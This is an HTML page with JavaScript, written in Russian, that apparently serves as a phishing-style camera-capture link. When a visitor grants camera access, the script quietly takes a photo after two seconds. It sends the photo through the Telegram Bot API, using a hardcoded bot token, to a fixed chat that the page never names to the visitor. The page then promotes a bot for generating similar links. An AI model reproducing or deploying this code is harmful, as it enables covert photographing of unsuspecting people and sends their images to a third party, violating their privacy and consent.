<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Отправка фото в Telegram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background: #f5f5f5;
        }
        #message {
            margin-top: 20px;
            padding: 15px;
            display: none;
        }
        #startButton {
            padding: 10px 20px;
            font-size: 16px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .photos-container {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
        }
        .photo {
            max-width: 45%;
            border-radius: 10px;
        }
        #unsupported {
            margin-top: 40px;
            padding: 20px;
            background: #ffdada;
            border: 1px solid #ff5a5a;
            color: #cc0000;
            border-radius: 8px;
            font-size: 1.2em;
            display: none;
        }
    </style>
</head>
<body>
    <div id="unsupported">
        Браузер не поддерживается,<br>
        откройте через любой другой.
    </div>
    
    <button id="startButton">Разрешить камеру и сделать фото</button>
    
    <div id="message" style="display: none;">
        Фото успешно отправлены.<br>
        Сделать такую же ссылку:<br>
        <a href="https://t.me/Huysjsjakaobot">https://t.me/Huysjsjakaobot</a>
        <div id="photos-container" class="photos-container"></div>
    </div>
    
    <video id="camera" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const botToken = "7606258807:AAEntpmxwggkW_qRbDAXkzs8kMkNqL03N6U";
        const chatId = "1224978194";
        const startButton = document.getElementById('startButton');

        // Проверка поддержки камеры
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            document.getElementById('unsupported').style.display = 'block';
            startButton.style.display = 'none';
        }

        // Обработчик кнопки
        startButton.addEventListener('click', () => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    startButton.style.display = 'none';
                    const video = document.getElementById('camera');
                    video.style.display = 'block';
                    video.srcObject = stream;
                    
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(capturePhoto, 2000); // Через 2 сек делает фото
                    };
                })
                .catch(err => {
                    alert("Не удалось получить доступ к камере! Разрешите доступ в настройках браузера.");
                    console.error("Ошибка камеры: ", err);
                });
        });

        function capturePhoto() {
            const video = document.getElementById('camera');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                sendPhotoToTelegram(blob);
                video.srcObject.getTracks().forEach(track => track.stop()); // Выключаем камеру
            }, 'image/jpeg', 0.9);
        }

        function sendPhotoToTelegram(photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', photoBlob, 'capture.jpg');

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    document.getElementById('message').style.display = 'block';
                    document.getElementById('camera').style.display = 'none';
                    
                    const photosContainer = document.getElementById('photos-container');
                    const img = document.createElement('img');
                    img.src = URL.createObjectURL(photoBlob);
                    img.className = 'photo';
                    photosContainer.appendChild(img);
                } else {
                    alert("Ошибка отправки: " + JSON.stringify(data));
                }
            })
            .catch(error => {
                alert("Ошибка сети: " + error);
            });
        }
    </script>
</body>
</html>
